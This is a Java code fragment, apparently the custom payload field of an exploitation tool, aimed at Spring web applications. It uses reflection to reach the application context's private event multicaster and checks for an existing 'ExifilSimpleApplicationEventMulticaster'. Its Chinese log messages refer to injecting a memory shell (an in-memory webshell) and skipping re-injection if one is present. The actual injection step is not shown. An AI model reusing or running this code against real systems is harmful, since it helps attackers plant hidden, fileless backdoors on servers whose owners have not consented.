customCode: try { org.springframework.web.context.request.ServletRequestAttributes attr = (org.springframework.web.context.request.ServletRequestAttributes) org.springframework.web.context.request.RequestContextHolder.currentRequestAttributes(); org.springframework.web.context.WebApplicationContext context = org.springframework.web.servlet.support.RequestContextUtils.findWebApplicationContext(attr.getRequest()); if (context == null) { System.out.println("无法获取 WebApplicationContext"); return; } java.lang.reflect.Field field = org.springframework.context.support.AbstractApplicationContext.class.getDeclaredField("applicationEventMulticaster"); field.setAccessible(true); Object currentMulticaster = field.get(context); System.out.println("当前 EventMulticaster 类型: " + currentMulticaster.getClass().getName()); if (currentMulticaster.getClass().getName().contains("ExifilSimpleApplicationEventMulticaster")) { System.out.println("内存马已存在，无需重复注入"); return; } System.out.println("准备注入内存马到 EventMulticaster"); } catch (Exception e) { System.err.println("内存马注入失败: " + e.getMessage()); e.printStackTrace(); }
